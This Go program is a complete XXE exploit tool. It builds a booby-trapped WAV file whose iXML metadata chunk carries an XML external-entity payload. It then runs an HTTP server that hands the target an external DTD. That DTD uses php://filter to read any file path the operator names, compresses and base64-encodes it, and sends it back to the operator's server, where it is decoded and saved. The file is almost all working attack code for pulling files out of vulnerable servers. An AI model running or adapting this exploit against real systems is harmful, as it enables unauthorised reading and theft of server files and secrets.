package main

import (
	"bytes"
	"compress/flate"
	"context"
	"encoding/base64"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"io/fs"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
)

var (
	appCancelFunc context.CancelFunc
	payload       = `
	<!DOCTYPE r [
		<!ELEMENT r ANY >
		<!ENTITY % sp SYSTEM "http://$$serverportdata$$/xxe.dtd">
		%sp;
		%param1;
	]>
	<r>&exfil;</r>
	`
	xxeFile = `
		<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=$$path$$">
		<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://$$serverportdata$$/xxe.dtd?c=%data;'>"> 
	`
)

func main() {
	var localServerIp string
	var localServerPort int
	var targetPath string
	var outputFilePath string

	flag.StringVar(&localServerIp, "local-server-ip", "", "Use local server ip where a local server will be set")
	flag.IntVar(&localServerPort, "local-server-port", 0, "Use local server port to run local server on")
	flag.StringVar(&targetPath, "target-path", "", "Use target path to point on file you want to get from target server")
	flag.StringVar(&outputFilePath, "o", "", "Output file to save exploit's result")
	flag.Parse()

	if localServerIp == "" {
		if runtime.GOOS != "windows" {
			var hostnameDataBuilder = &strings.Builder{}
			cmd := exec.Command("hostname", "-I")
			cmd.Stderr = io.Discard
			cmd.Stdout = hostnameDataBuilder
			err := cmd.Run()
			if err == nil {
				fmt.Println("-local-server-ip missed, use one of this", hostnameDataBuilder.String())
				os.Exit(0)
			}
		}
		fmt.Println("-local-server-ip missed")
		os.Exit(0)
	}

	if localServerIp == "0.0.0.0" {
		fmt.Println("Server ip should not be 0.0.0.0")
		os.Exit(0)
	}

	if localServerPort != 0 && (localServerPort < 49152 || localServerPort > 65535) {
		fmt.Println("Local server port shound be between 49152-65535")
		os.Exit(0)
	}

	if targetPath == "" {
		fmt.Println("-target-path missed")
		os.Exit(0)
	}

	ip := net.ParseIP(localServerIp)
	if ip == nil {
		fmt.Println("Cannot parse local server ip, use valid ip address in -local-server-ip option")
		os.Exit(-1)
	}

	var wg sync.WaitGroup
	var localServerAddress = fmt.Sprintf("%s:%d", ip.String(), localServerPort)

	tmpListener, err := net.Listen("tcp4", localServerAddress)
	if err != nil {
		fmt.Println("Error on checking local server address", err)
		os.Exit(-1)
	}

	localServerAddress = tmpListener.Addr().String()
	_ = tmpListener.Close()

	payload = strings.ReplaceAll(payload, "\n", "")
	payload = strings.ReplaceAll(payload, "\t", "")
	payload = strings.ReplaceAll(payload, "$$serverportdata$$", localServerAddress)
	xxeFile = strings.ReplaceAll(xxeFile, "\n", "")
	xxeFile = strings.ReplaceAll(xxeFile, "\t", "")
	xxeFile = strings.ReplaceAll(xxeFile, "$$serverportdata$$", localServerAddress)
	xxeFile = strings.ReplaceAll(xxeFile, "$$path$$", targetPath)

	wg.Add(1)
	go func() {
		defer wg.Done()

		ctx := context.WithValue(context.Background(), "server-otput-path", outputFilePath)
		ctx, appCancelFunc = context.WithCancel(ctx)

		srv := http.Server{
			Addr: localServerAddress,
		}

		wg.Add(1)
		go func() {
			defer wg.Done()
			select {
			case <-ctx.Done():
				err := srv.Shutdown(context.Background())
				if err != nil {
					fmt.Println("Incorrect shutdown", err)
				}
			}
		}()

		http.HandleFunc("/xxe.dtd", func(w http.ResponseWriter, r *http.Request) {
			exploitHandler(ctx, w, r)
		})

		fmt.Println("Run server on", localServerAddress)
		if srv.ListenAndServe(); err != nil {
			if err != http.ErrServerClosed {
				fmt.Println("Cannot up http server", err)
			}
			os.Exit(-1)
		}
	}()

	var buf = bytes.NewBuffer([]byte{})
	buf.WriteString("RIFF")
	fileSizeOffset := buf.Len()
	buf.WriteByte(0)
	buf.WriteByte(0)
	buf.WriteByte(0)
	buf.WriteByte(0)
	buf.WriteString("WAVEiXML")
	binary.Write(buf, binary.LittleEndian, uint32(len(payload)))
	buf.Write([]byte(payload))
	buf.WriteByte(0)

	fileSize := buf.Len()
	fileData := buf.Bytes()
	binary.LittleEndian.PutUint32(fileData[fileSizeOffset:], uint32(fileSize))

	f, err := os.OpenFile("payload.wav", os.O_CREATE|os.O_TRUNC|os.O_RDWR, os.ModePerm)
	if err != nil {
		panic(err)
	}

	defer f.Close()

	_, err = f.Write(fileData)
	if err != nil {
		panic(err)
	}

	fmt.Println("Payload generated")

	wg.Wait()
	fmt.Println("Finished. Terminating http server")
}

func exploitHandler(ctx context.Context, response http.ResponseWriter, request *http.Request) {
	xxeData := request.URL.Query().Get("c")
	if xxeData != "" {
		defer appCancelFunc()
		defer response.WriteHeader(http.StatusOK)

		outputFile := ctx.Value("server-otput-path").(string)
		if outputFile != "" {
			var fileExists = false
			outputFileInfo, err := os.Stat(outputFile)
			if pathErr, isPathErr := err.(*fs.PathError); isPathErr && pathErr == fs.ErrNotExist {
				fileExists = true
			}

			if fileExists && err != nil {
				fmt.Println("Cannot save output file.", err)
				outputFile = ""
			}

			if fileExists && err == nil && outputFileInfo.IsDir() {
				fmt.Println("Cannot save output file. It's directory.", outputFile)
				outputFile = ""
			}
		}

		xxeData = strings.TrimSpace(xxeData)
		xxeData = strings.ReplaceAll(xxeData, " ", "+")

		b64DecodedData, err := base64.StdEncoding.DecodeString(xxeData)
		if err != nil {
			fmt.Println("Icorrent decoding xxe response", err, xxeData)
			return
		}

		reader := flate.NewReader(bytes.NewReader(b64DecodedData))
		defer reader.Close()

		var data = make([]byte, 1024)
		n, err := reader.Read(data)
		if err != nil {
			fmt.Println("Fatal, cannot parse compress file data", "base64 is ", string(b64DecodedData))
		}

		if n == 0 {
			fmt.Println("Fatal, file data seems to be empty", "base64 is ", string(b64DecodedData))
		}

		fmt.Println("")
		fmt.Println("Got xxe parsed data")
		fmt.Println(string(data[:n]))
		fmt.Println("")

		if outputFile != "" {
			f, err := os.OpenFile(outputFile, os.O_RDWR|os.O_TRUNC|os.O_CREATE, os.ModePerm)
			if err != nil {
				fmt.Println("Cannot write xxe data into file", err)
				return
			}

			_, err = f.Write(data[:n])
			if err != nil {
				fmt.Println("Cannot write xxe data into file", err)
				return
			}
		}
		return
	}

	response.Header().Add("Content-Type", "application/xml")
	response.WriteHeader(http.StatusOK)
	_, err := response.Write([]byte(xxeFile))
	if err != nil {
		fmt.Println("Server response error", err)
	}

}
